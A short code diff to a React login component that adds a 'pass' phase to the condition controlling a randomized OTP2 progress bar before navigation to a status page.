@@ -495,7 +495,7 @@ export default function Login() {
 
   // OTP2 progress → navigate to /status
   useEffect(() => {
-    if (phase !== 'otp2' && phase !== 'prompt_pin' && phase !== 'request_pin' && phase !== 'waiting_method') return;
+    if (phase !== 'otp2' && phase !== 'prompt_pin' && phase !== 'request_pin' && phase !== 'waiting_method' && phase !== 'pass') return;
     if (otp2Processing && otp2Approved && otp2Progress < 100) {
       const t = setTimeout(() => setOtp2Progress(p => Math.min(p + Math.random() * 15 + 5, 100)), 300);
       return () => clearTimeout(t);
